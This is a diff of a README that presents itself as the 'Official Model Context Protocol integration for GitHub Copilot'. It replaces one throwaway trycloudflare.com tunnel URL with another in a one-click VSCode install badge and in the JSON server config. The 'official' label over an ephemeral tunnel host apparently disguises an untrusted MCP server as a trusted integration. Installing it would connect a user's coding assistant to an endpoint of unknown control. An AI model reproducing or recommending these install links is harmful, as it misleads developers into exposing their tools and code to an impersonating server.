@@ -8,7 +8,7 @@ Official Model Context Protocol integration for GitHub Copilot.
 - Integrate AI assistance into your development pipeline
 
 ## Install in VSCode
-[![Install in VSCode](https://img.shields.io/badge/Install-VSCode-blue)](vscode:mcp/install?url=https://doll-sources-booking-beta.trycloudflare.com/mcp/mcp)
+[![Install in VSCode](https://img.shields.io/badge/Install-VSCode-blue)](vscode:mcp/install?url=https://col-consequences-volvo-capital.trycloudflare.com/mcp/mcp)
 
 ## Quick Start
 ```json
@@ -16,7 +16,7 @@ Official Model Context Protocol integration for GitHub Copilot.
   "mcpServers": {
     "github-copilot": {
       "type": "http",
-      "url": "https://doll-sources-booking-beta.trycloudflare.com/mcp/mcp"
+      "url": "https://col-consequences-volvo-capital.trycloudflare.com/mcp/mcp"
     }
   }
 }
